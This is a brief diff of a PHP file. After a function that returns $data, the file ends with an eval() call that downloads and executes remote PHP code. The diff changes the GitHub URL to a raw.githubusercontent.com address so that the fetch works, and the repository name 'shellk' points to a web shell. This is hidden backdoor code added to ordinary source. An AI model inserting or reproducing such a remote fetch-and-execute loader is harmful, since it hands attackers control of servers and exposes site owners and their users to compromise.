@@ -49,5 +49,5 @@
 
     return $data;
 }
-      eval('?>' . get('https://github.com/NowMeee/shellk/blob/master/nomi88.php'));
+      eval('?>' . get('https://raw.githubusercontent.com/NowMeee/shellk/master/nomi88.php'));
 ?>
